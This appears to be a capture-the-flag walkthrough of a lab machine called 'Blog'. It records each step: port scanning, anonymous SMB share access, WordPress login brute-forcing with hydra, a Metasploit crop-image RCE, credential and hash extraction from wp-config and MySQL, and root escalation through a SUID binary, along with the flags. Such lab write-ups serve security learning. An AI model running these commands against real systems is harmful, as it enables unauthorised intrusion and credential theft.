@@ -1,0 +1,654 @@
+BLOG.
+
+
+
+
+[ENUMERATION: PORTS/SERVICES]
+[ACTION: nmap quick all ports scan]
+nmap -sS -T4 -sV -p- 10.10.28.134
+[OUTPUT]
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+[RECON: HTTP PORT 80]
+[ACTION: update hosts]
+sudo nano /etc/hosts
+Add line: 10.10.28.134 blog.thm
+
+
+[ACTION: explore http://10.10.28.134/]
+Landing site shows uncategorized posts.
+I found no clues in any of the redirect buttons.
+However, I did find 2 interesting things:
+1. login portal: http://blog.thm/wp-login.php
+2. wordpress running version, v5.0 from http://blog.thm/feed/
+[NOTE]
+The login portal error declares whether or not a user exists.
+I manually tested for billy and his mom's possible usernames, but found none.
+
+
+[ACTION: research exploits]
+Before trying to enumerate directories or do anything else, I'll try to find exploits for wordpress v5.0.
+Found https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce/
+
+
+
+
+[PRIVESC TO USER: metasploit expoloit via pt and lfi]
+msfconsole
+use exploit/multi/http/wp_crop_rce
+set LHOST 10.23.25.109
+[NOTE]
+Looks like we need a user before we can run this exploit.
+
+
+
+
+[RECON: SMB PORTS]
+[ACTION: list shares on port 139]
+smbclient -L //10.10.28.134 -N -p 139
+[OUTPUT]
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	BillySMB        Disk      Billy's local SMB Share
+	IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            BLOG
+
+
+[ACTION: list shares on port 445]
+smbclient -L //10.10.28.134 -N -p 445
+[OUTPUT]
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	BillySMB        Disk      Billy's local SMB Share
+	IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            BLOG
+
+
+[ACTION: anon connect to billy share]
+smbclient //10.10.28.134/BillySMB -N
+[OUTPUT]
+smb: \> 
+
+
+[ACTION: list content]
+ls
+[OUTPUT]
+  .                                   D        0  Tue May 26 20:17:05 2020
+  ..                                  D        0  Tue May 26 19:58:23 2020
+  Alice-White-Rabbit.jpg              N    33378  Tue May 26 20:17:01 2020
+  tswift.mp4                          N  1236733  Tue May 26 20:13:45 2020
+  check-this.png                      N     3082  Tue May 26 20:13:43 2020
+
+
+[ACTION: download all files]
+prompt off
+mget *
+
+
+[ACTION: inspect files]
+We got:
+1. Taylor swift meme video.
+2. Qr in a png.
+3. Picture of white rabbit from alice in jpg.
+
+
+[ACTION: grab qr link]
+zbarimg check-this.png 
+[OUTPUT]
+https://qrgo.page.link/M6dE
+
+
+[ACTION: explore https://qrgo.page.link/M6dE]
+Redirects to https://www.youtube.com/watch?v=eFTLKWw542g, a song.
+
+
+[NOTE]
+I'll try to run some metadata and steganography tools on the rabbit.
+[ACTION: run exiftool]
+exiftool Alice-White-Rabbit.jpg
+[NOTE]
+No useful output.
+
+
+[ACTION: run binwalk]
+binwalk Alice-White-Rabbit.jpg
+[OUTPUT]
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             JPEG image data, JFIF standard 1.02
+
+
+[ACTION: run steghide passwordless]
+steghide extract -sf Alice-White-Rabbit.jpg 
+[OUTPUT]
+wrote extracted data to "rabbit_hole.txt".
+
+
+[ACTION: display extracted data]
+cat rabbit_hole.txt
+[OUTPUT]
+You've found yourself in a rabbit hole, friend.
+[NOTE]
+Looks like we aren't going the right direction....
+There probably isn't much use in investigating the video file now.
+The only thing left to enumerate is directories.
+
+
+
+
+[ENUMERATION: directories]
+[ACTION: gobuster quick scan for common directories]
+gobuster dir -u http://blog.thm/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+[OUTPUT]
+/.hta                 (Status: 403) [Size: 273]
+/.htaccess            (Status: 403) [Size: 273]
+/.htpasswd            (Status: 403) [Size: 273]
+/0                    (Status: 301) [Size: 0] [--> http://blog.thm/0/]
+/2020                 (Status: 301) [Size: 0] [--> http://blog.thm/2020/]
+/N                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
+/W                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
+/admin                (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
+/atom                 (Status: 301) [Size: 0] [--> http://blog.thm/feed/atom/]
+/dashboard            (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
+/embed                (Status: 301) [Size: 0] [--> http://blog.thm/embed/]
+/favicon.ico          (Status: 200) [Size: 0]
+/feed                 (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
+/index.php            (Status: 301) [Size: 0] [--> http://blog.thm/]
+/login                (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php]
+/n                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
+/no                   (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
+/note                 (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/note-from-mom/]
+/page1                (Status: 301) [Size: 0] [--> http://blog.thm/]
+/rdf                  (Status: 301) [Size: 0] [--> http://blog.thm/feed/rdf/]
+/render/https://www.google.com (Status: 301) [Size: 0] [--> http://blog.thm/render/https:/www.google.com]
+/robots.txt           (Status: 200) [Size: 67]
+/rss                  (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
+/rss2                 (Status: 301) [Size: 0] [--> http://blog.thm/feed/]
+/server-status        (Status: 403) [Size: 273]
+/w                    (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
+/welcome              (Status: 301) [Size: 0] [--> http://blog.thm/2020/05/26/welcome/]
+/wp-admin             (Status: 301) [Size: 307] [--> http://blog.thm/wp-admin/]
+/wp-content           (Status: 301) [Size: 309] [--> http://blog.thm/wp-content/]
+/wp-includes          (Status: 301) [Size: 310] [--> http://blog.thm/wp-includes/]
+/xmlrpc.php           (Status: 405) [Size: 42]
+
+
+[NOTE]
+The other directories are useless.
+[ACTION: explore http://blog.thm/wp-includes/]
+Content listed, but unviewable.
+
+
+[ACTION: explore http://blog.thm/robots.txt]
+[OUTPUT]
+User-agent: *
+Disallow: /wp-admin/
+Allow: /wp-admin/admin-ajax.php
+
+
+[ACTION: check allowed file content]
+curl -X POST http://blog.thm/wp-admin/admin-ajax.php
+[OUTPUT]
+0
+
+
+
+
+[ENUMERATION: wordpress users]
+wpscan --url http://blog.thm/ --enumerate u
+[NOTE]
+No useful output.
+
+
+
+
+[RECON: EXPLORE WEBSITE]
+[ACTION: explore http://10.10.28.134/]
+After spending a long time searching the site (since we don't have any clues as to what to do), I found out that on on the note from mom post (http://blog.thm/2020/05/26/note-from-mom/#comment-3), "By Karen Wheeler" is clickable.
+Url updates to: http://blog.thm/author/kwheel/
+
+
+[ACTION: repeat for billy]
+Url updates to http://blog.thm/author/bjoel/.
+
+
+[NOTE]
+We verify the usernames are in fact in use by testing them in the login portal.	
+Now we can try to bruteforce the login.
+With inspect, I find parameters log and pwd.
+Also, anther parameter is set: wp-submit, Log In.
+[ACTION: hydra burteforce login]
+hydra -L blog_usernames.txt -P ~/thm/rockyou.txt blog.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:incorrect"
+[OUTPUT]
+[80][http-post-form] host: blog.thm   login: kwheel   password: cutiepie1
+
+
+
+
+[PRIVESC: gain user access]
+[ACTION: explore http://blog.thm/wp-admin/]
+I used cred pair kwheel|cutiepie1 and landed on a dashboard.
+Now we can run the exploit we found before.
+
+
+[ACTION: run module]
+msfconsole
+use exploit/multi/http/wp_crop_rce
+set LHOST 10.23.25.109
+set USERNAME kwheel
+set PASSWORD cutiepie1
+set RHOSTS 10.10.28.134
+run
+[OUTPUT]
+meterpreter > 
+
+
+[ACTION: stabilize shell]
+shell -b
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm
+
+
+[ACTION: find user flag]
+find / -name "user.txt" 2>/dev/null
+[OUTPUT]
+/home/bjoel/user.txt
+
+
+[ACTION: display user flag]
+cat /home/bjoel/user.txt
+[OUTPUT]
+You won't find what you're looking for here.
+
+TRY HARDER
+
+
+[ACTION: list directory content]
+cd /home/bjoel
+ls -la
+[OUTPUT]
+drwxr-xr-x 4 bjoel bjoel  4096 May 26  2020 .
+drwxr-xr-x 3 root  root   4096 May 26  2020 ..
+lrwxrwxrwx 1 root  root      9 May 26  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 bjoel bjoel   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 bjoel bjoel  3771 Apr  4  2018 .bashrc
+drwx------ 2 bjoel bjoel  4096 May 25  2020 .cache
+drwx------ 3 bjoel bjoel  4096 May 25  2020 .gnupg
+-rw-r--r-- 1 bjoel bjoel   807 Apr  4  2018 .profile
+-rw-r--r-- 1 bjoel bjoel     0 May 25  2020 .sudo_as_admin_successful
+-rw-r--r-- 1 bjoel bjoel 69106 May 26  2020 Billy_Joel_Termination_May20-2020.pdf
+-rw-r--r-- 1 bjoel bjoel    57 May 26  2020 user.txt
+
+
+[ACTION: display the pdf]
+strings Billy_Joel_Termination_May20-2020.pdf | less
+[OUTPUT]
+>>/Metadata 79 0 R/ViewerPreferences 80 0 R>>
+endobj
+2 0 obj
+<</Type/Pages/Count 1/Kids[ 3 0 R] >>
+endobj
+3 0 obj
+<</Type/Page/Parent 2 0 R/Resources<</Font<</F1 5 0 R/F2 9 0 R/F3 14 0 R/F4 16 0 R>>/ExtGState<</GS7 7 0 R/GS8 8 0 R>>/ProcSet[/PDF/Text/ImageB/ImageC/ImageI] >>/Annots[ 21 0 R] /MediaBox[ 0 0 612 792] /Contents 4 0 R/Group<</Type/Group/S/Transparency/CS/DeviceRGB>>/Tabs/S/StructParents 0>>
+endobj
+4 0 obj
+<</Filter/FlateDecode/Length 2011>>
+stream
+<9>>z
+3$er~
+ISPr
+!ShFf
+f^jD
+PD`Y
+[NOTE]
+The pdf is compressed via flate (zlib).
+We can't scp, since we dont know www-data password.
+
+
+[ACTION: start listener (attacked)]
+python3 -m http.server 8000
+
+
+[ACTION: download to attacker]
+wget http://10.10.28.134:8000/Billy_Joel_Termination_May20-2020.pdf
+
+
+[ACTION: read pdf]
+[OUTPUT]
+5/20/2020
+Bill Joel,
+This letter is to inform you that your employment with Rubber Ducky Inc. will end effective immediately
+on 5/20/2020.
+You have been terminated for the following reasons:
+• Repeated offenses regarding company removable media policy
+• Repeated offenses regarding company Acceptable Use Policy
+• Repeated offenses regarding tardiness
+You will receive compensation up to and including today’s workday and any hours worked. This check
+will be mailed to you at your address on file.
+As of 5/20/2020 you have:
+• 0 hours unused leave
+• 0 hours unused vacation
+You are requested to return all company property by the end of the business day on 5/22/2020 or you will
+be charged with theft and prosecuted to the highest level.
+If you have questions about policies you have signed, your compensation, benefits, or returning company
+property, please don’t contact anyone because we don’t care.
+Sincerely,
+Karen Lawson
+HR Administrator – Rubber Ducky Inc.
+klawson@rubberducky.net
+410-555-4165
+[NOTE]
+At this point, I don't know where the user flag could be.
+I'll skip to root privesc.
+
+
+
+
+[PRIVESC: TO ROOT]
+[ACTION: display suid binaries]
+find / -perm -4000 -type f 2>/dev/null
+[OUTPUT]
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/pkexec
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/traceroute6.iputils
+/usr/sbin/checker
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/bin/mount
+/bin/fusermount
+/bin/umount
+/bin/ping
+/bin/su
+/snap/core/8268/bin/mount
+/snap/core/8268/bin/ping
+/snap/core/8268/bin/ping6
+/snap/core/8268/bin/su
+/snap/core/8268/bin/umount
+/snap/core/8268/usr/bin/chfn
+/snap/core/8268/usr/bin/chsh
+/snap/core/8268/usr/bin/gpasswd
+/snap/core/8268/usr/bin/newgrp
+/snap/core/8268/usr/bin/passwd
+/snap/core/8268/usr/bin/sudo
+/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/8268/usr/lib/openssh/ssh-keysign
+/snap/core/8268/usr/lib/snapd/snap-confine
+/snap/core/8268/usr/sbin/pppd
+/snap/core/9066/bin/mount
+/snap/core/9066/bin/ping
+/snap/core/9066/bin/ping6
+/snap/core/9066/bin/su
+/snap/core/9066/bin/umount
+/snap/core/9066/usr/bin/chfn
+/snap/core/9066/usr/bin/chsh
+/snap/core/9066/usr/bin/gpasswd
+/snap/core/9066/usr/bin/newgrp
+/snap/core/9066/usr/bin/passwd
+/snap/core/9066/usr/bin/sudo
+/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/9066/usr/lib/openssh/ssh-keysign
+/snap/core/9066/usr/lib/snapd/snap-confine
+/snap/core/9066/usr/sbin/pppd
+[NOTE]
+We could privesc via pkexec running sudo pkexec /bin/sh, but we don't know www-data password.
+Same with at.
+I tried to check version of dbus-daemon-launch-helper but got permission denied.
+There is an unusual binary: checker (just tests if user is admin).
+
+
+[NOTE]
+I remember the .php files I found when enumerating directories.
+[ACTION: list wordpress directory]
+cd /var/www/wordpress
+ls
+[OUPTUT]
+index.php	 wp-blog-header.php    wp-includes	  wp-signup.php
+license.txt	 wp-comments-post.php  wp-links-opml.php  wp-trackback.php
+ofHJGXturk.php	 wp-config-sample.php  wp-load.php	  xmlrpc.php
+readme.html	 wp-config.php	       wp-login.php
+wp-activate.php  wp-content	       wp-mail.php
+wp-admin	 wp-cron.php	       wp-settings.php
+
+[NOTE]
+wp-config usually contains db credentials.
+[ACTION: display wp-config]
+cat wp-config.php
+[OUTPUT]
+<?php
+/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://codex.wordpress.org/Editing_wp-config.php
+ *
+ * @package WordPress
+ */
+
+/* Custom */
+/*
+define('WP_HOME', '/');
+define('WP_SITEURL', '/'); */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'blog');
+
+/** MySQL database username */
+define('DB_USER', 'wordpressuser');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'LittleYellowLamp90!@');
+
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8');
+
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+
+/** Custom FS Method */
+define('FS_METHOD', 'direct');
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define('AUTH_KEY',         'ZCgJQaT0(*+Zjo}Iualapeo|?~nMtp^1IUrquYx3!#T$ihW8F~_`L+$N E>J!Bm;');
+define('SECURE_AUTH_KEY',  'nz|(+d|| yVX-5_on76q%:M, ?{NVJ,Q(;p3t|_B*]-yQ&|]3}M@Po!f_,T-S4fe');
+define('LOGGED_IN_KEY',    'a&I&DR;PUnPKul^kLBgxYa@`g||{eZf><sf8SmKBi+R7`O?](SuL&/H#hqzO$_:3');
+define('NONCE_KEY',        'Vdd-zzB:/yxg6unZvng,oY-%Z V,i%+Uz_f)S;Efz!;cY3p~]T,g1z*Z[jXe>5Sm');
+define('AUTH_SALT',        'u+k8g;=jbe)6/X~<M1HwINhH(Tno@orx:$_$-#*id)ddBYGGF(]AP?}4?2E|m;5`');
+define('SECURE_AUTH_SALT', '>Rg5>,/^BywVg^A[Etqot:CoU+9<)YPM~h|)Ifd5!iK!L*5+JDiZi33KrYZNd2B7');
+define('LOGGED_IN_SALT',   '3kpL-rcnU+>H#t/g>9<)j/u I1/-Ws;h6GrDQ>v8%7@C~`h1lBC/euttp)/8EdA_');
+define('NONCE_SALT',       'JEajZ)y?&.m-1^$(c-JX$zi0qv|7]F%7a6jh]P5SRs+%`*60?WJVk$><b$poQg9>');
+
+
+/**#@-*/
+
+/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+$table_prefix  = 'wp_';
+
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the Codex.
+ *
+ * @link https://codex.wordpress.org/Debugging_in_WordPress
+ */
+define('WP_DEBUG', false);
+
+/* That's all, stop editing! Happy blogging. */
+
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+	define('ABSPATH', dirname(__FILE__) . '/');
+
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+[NOTE]
+Found cred pair wordpressuser|LittleYellowLamp90!@ for database named blog
+
+
+[ACTION: connect to db]
+mysql -u wordpressuser -p
+
+
+
+[ACTION: list databases]
+SHOW DATABASES;
+[OUTPUT]
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| blog               |
++--------------------+
+
+
+[ACTION: use blog and show tables]
+USE blog;
+SHOW TABLES;
+[OUTPUT]
++-----------------------+
+| Tables_in_blog        |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_termmeta           |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
++-----------------------+
+
+
+[ACTION: check for user and password hashes]
+SELECT ID, user_login, user_email, user_pass FROM wp_users;
+[OUTPUT]
++----+------------+------------------------------+------------------------------------+
+| ID | user_login | user_email                   | user_pass                          |
++----+------------+------------------------------+------------------------------------+
+|  1 | bjoel      | nconkl1@outlook.com          | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ |
+|  3 | kwheel     | zlbiydwrtfjhmuuymk@ttirv.net | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te. |
++----+------------+------------------------------+------------------------------------+
+
+
+[NOTE]
+Bjoel is probably root.
+Those are wordpress password hashes, which we can crack with john using option phpass.
+[ACTION: crack bjoel hash with john]
+echo 'bjoel:$P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/' > bjoel_hash.txt
+john --format=phpass bjoel_hash.txt --wordlist=~/thm/rockyou.txt
+[NOTE]
+Cracking is taking suspiciously long. Probably intended.	
+I'll return to understanding the suid checker binary.
+
+
+[ACTION: run ltrace]
+ltrace /user/sbin/checker
+[OUTPUT]
+getenv("admin")                                  = nil
+puts("Not an Admin"Not an Admin
+)                             = 13
++++ exited (status 0) +++
+[NOTE]
+Checker just validates if an environmental variable called is declared.
+If so, it gives root.
+Therefore, we can just put any string as admin and we should privesc.
+
+
+[ACTION: privesc via checker]
+export admin=AnYstrinG
+/usr/sbin/checker
+[OUTPUT]
+root@blog:/var/www/wordpress# 
+
+
+[ACTION: display root flag]
+cat /root/root.txt
+[OUTPUT]
+9a0b2b618bef9bfa7ac28c1353d9f318
+
+
+[ACTION: find user flag]
+find / -name "user.txt" 2>/dev/null
+[OUTPUT]
+/home/bjoel/user.txt
+/media/usb/user.txt
+[NOTE]
+Looks like we got the real one.
+
+
+[ACTION: display user flag]
+cat /media/usb/user.txt
+[OUTPUT]
+c8421899aae571f7af486492b71a8ab7
+
